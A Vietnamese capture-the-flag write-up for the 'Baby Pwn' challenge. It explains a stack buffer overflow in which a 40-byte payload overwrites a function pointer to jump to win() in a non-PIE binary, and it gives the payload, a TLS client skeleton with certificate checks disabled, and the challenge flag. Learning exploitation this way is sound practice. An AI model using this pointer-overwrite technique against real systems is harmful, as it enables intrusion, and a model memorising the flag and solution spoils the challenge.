---
title: "Baby Pwn"
category: "Pwn"
tags: ["stack-overflow","pointer-overwrite","win-function","tls"]
solve_date: "2026-10-10"
language: "vi"
---

# Baby Pwn

**Flag:** `FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_d3a9f581e8}`  
**Dịch vụ:** `ncat --ssl baby-pwn-2dad64dd9c44.inst14.ctf.fortid.com 1337` (TLS trên cổng 1337). Artifact: `handout.zip` 5.9 KB chứa `chall` 17040 B (ELF non-PIE) và `chall.c`.

## Đề bài

Dịch vụ nhận đơn đánh giá (review) theo luồng có hai phần: một buffer "draft" cho nội dung nháp và một đường preview cho mục yêu thích (favourite). Binary đi kèm là non-PIE. Mục tiêu là chuyển hướng quyền điều khiển sang hàm `win()` để đường preview in ra phần thưởng.

## Phân tích

Trong luồng review, vùng dẫn nhập của bản "draft" dài đúng 40 byte và con trỏ display (địa chỉ hàm in nội dung preview) được lưu liền kề. Payload đã ghi nhận là 32 byte filler cộng 8 byte địa chỉ, tức 8 byte cuối của vùng 40 byte trùng vị trí con trỏ display: chỉ cần viết đủ 40 byte là định lại được con trỏ, không cần tràn thêm.

Cấu trúc payload: 32 byte đầu là filler, 8 byte sau (offset 32–39) là địa chỉ hàm đích. Trên ELF non-PIE, địa chỉ `win()` cố định và lấy thẳng từ bảng symbol: `0x40135F`.

```python
payload = b"A" * 32 + p64(0x40135F)
```

`p64` đóng gói `0x40135F` little-endian thành 8 byte. Tổng payload đúng 40 byte, khớp kích thước buffer "draft". Khi đường favourite preview chạy, nó dereference con trỏ display vừa bị ghi đè, nhảy vào `win()`, và `win()` in chuỗi phần thưởng.

## Lời giải

1. Đọc địa chỉ `win()` từ symbol table của `chall` (non-PIE nên không cần leak base): `0x40135F`.
2. Dựng payload 40 byte: `b"A"*32 + p64(0x40135F)`, phủ vừa buffer "draft" và ghi đè con trỏ display.
3. Gửi payload lên instance qua TLS. Client dùng module `ssl` của Python thô (xem mục "Các hướng đã kiểm tra"), vì các cách kết nối đã thử khác đều lỗi TLS trên host này.
4. Yêu cầu favourite preview; dịch vụ đi qua con trỏ display đã bị trỏ vào `win()` và in phần thưởng kèm cờ:

   ```text
   > Five stars! Here is your prize:
   FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_d3a9f581e8}
   ```

## Kết quả

```text
FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_d3a9f581e8}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 với module `ssl` chuẩn (không phụ thuộc pwntools cho phần mạng vì `remote(..., ssl=True)` lỗi trên host này). Địa chỉ `0x40135F` cố định vì `chall` non-PIE, lấy từ symbol table.

Payload:

```python
from struct import pack
payload = b"A" * 32 + pack("<Q", 0x40135F)
assert len(payload) == 40
```

Khung client tối thiểu bằng module `ssl` thô, cổng 1337. Bản `client.py` đã dùng là script hỗ trợ tại local, không nằm trong handout nên không được chép nguyên văn ở đây; khung dưới đây tương đương về mặt giao diện kết nối:

```python
import socket, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
host = "baby-pwn-2dad64dd9c44.inst14.ctf.fortid.com"
s = ctx.wrap_socket(socket.socket(), server_hostname=host)
s.connect((host, 1337))
# after reading the banner: send the 40-byte draft payload, then request the favourite preview
```

Hoặc dùng ncat trên hệ thống hỗ trợ redirect ổn định:

```text
ncat --ssl baby-pwn-2dad64dd9c44.inst14.ctf.fortid.com 1337
```

Toàn bộ chuỗi được chạy trên instance trực tiếp; binary handout không cần thực thi cục bộ.
